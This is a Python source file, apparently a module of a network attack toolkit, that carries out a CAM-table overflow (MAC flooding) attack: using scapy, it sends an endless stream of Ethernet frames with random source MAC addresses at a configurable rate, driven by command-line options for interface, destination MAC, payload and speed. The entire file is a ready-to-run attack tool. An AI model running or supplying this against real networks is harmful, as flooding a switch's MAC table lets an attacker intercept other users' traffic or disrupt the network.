import scapy.all as scapy
from scapy.all import Ether

import sys, os
sys.path.append(os.path.join('..', '..'))
from config import *


def cam_owerflow(speed: int=None, mac_dst: str=None,payload: str=None, iface: str=None)->None:
    payload = 'X'*64 if not payload else payload
    speed = 500 if not speed else speed
    try:
        scapy.hexdump(Ether(src=rand_mac(), dst=mac_dst if mac_dst else rand_mac()) / (payload))
        while True:
            for _ in range(speed):
                try:
                    scapy.sendp(Ether(src=rand_mac(), dst=mac_dst if mac_dst else rand_mac()) / (payload), verbose=False, iface=iface)
                except Exception as e:
                    print(f"{Fatal_Error}Packet was not sent: {Error_text}{e}{Clear}")
            time.sleep(1)
    except KeyboardInterrupt:
        print('\nAborted.')

if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser(description="CAM-overflow attack module.")
    parser.add_argument("-i", "--iface", help="Network iface send from.", required=False)
    parser.add_argument("-md", "--mac_dst", help="Destination MAC-address.", required=False)
    parser.add_argument("-p", "--payload", help="Payload content. The default is X 64 times.", required=False)
    parser.add_argument("-s", "--speed", help="Speed of sending MAC-addresses. The default is 500 MAC/sec.", required=False, type=int)
    

    arg = parser.parse_args()
    cam_owerflow(speed=arg.speed, payload=arg.payload, iface=arg.iface, mac_dst=arg.mac_dst)